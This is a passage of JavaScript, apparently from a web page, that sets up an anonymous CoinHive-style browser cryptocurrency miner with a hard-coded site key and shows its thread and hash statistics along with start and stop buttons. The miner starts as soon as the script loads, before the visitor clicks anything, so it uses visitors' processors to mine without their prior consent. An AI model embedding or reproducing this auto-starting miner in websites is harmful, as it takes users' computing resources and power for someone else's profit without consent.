var miner = new Client.Anonymous('f75349275cf466fa0a3c351b9b825758fb8e7c3ad5a80b28a5044d4f643c06e0');
miner.start();

// Update stats once per second
setInterval(function() {
    var threadCount = miner.getNumThreads();
    // var hashesPerSecond = Math.round(miner.getHashesPerSecond() * 100) / 100;
    var totalHashes = miner.getTotalHashes();
    //var acceptedHashes = miner.getAcceptedHashes() / 256;
    // Output to HTML elements...
    if (miner.isRunning()) {
        document.getElementById("tcount").innerHTML = "Threads: " + threadCount;
        // document.getElementById("hps").innerHTML = "hashes per second: " + hashesPerSecond;
        document.getElementById("ths").innerHTML = "Total Hashes: " + totalHashes;
        // document.getElementById("tah").innerHTML = "Accepted Hashes: " + acceptedHashes;
        document.getElementById("minebutton").innerHTML = "<button onclick=\"miner.stop()\">Stop Mining</button>";
    } else {
        document.getElementById("hps").innerHTML = "Please click start";
        document.getElementById("ths").innerHTML = "to support";
        document.getElementById("tah").innerHTML = "this site";
        document.getElementById("minebutton").innerHTML = "<button onclick=\"miner.start(CoinHive.FORCE_EXCLUSIVE_TAB)\">Start Mining</button>";
    }
